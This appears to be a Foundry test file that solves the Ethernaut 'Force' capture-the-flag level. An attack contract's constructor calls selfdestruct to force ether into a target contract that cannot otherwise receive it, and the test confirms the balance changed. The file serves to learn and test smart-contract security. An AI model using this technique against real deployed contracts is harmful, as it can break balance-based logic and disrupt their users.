// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Force} from "../../src/ethernaut-007-force/Force.sol";

contract ForceTest is Test {
    Force public force;
    address public attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        force = new Force();
    }

    function test_force() public {
        vm.startPrank(attacker);

        // Verify starts at 0
        assertEq(address(force).balance, 0);
        console.log("Before:", address(force).balance);

        // Send ETH when deploying attack contract!
        new ForceAttack{value: 0.001 ether}(payable(address(force)));

        // Verify Force has ETH now
        assertGt(address(force).balance, 0);
        console.log("After:", address(force).balance);

        vm.stopPrank();
    }
}

contract ForceAttack {
    // 1. Destroys the contract
    // 2. Forces ALL ETH to target

    constructor(address payable _target) payable {
        // msg.value > 0 because we sent ETH on deployment ✅
        selfdestruct(_target);
    }
}
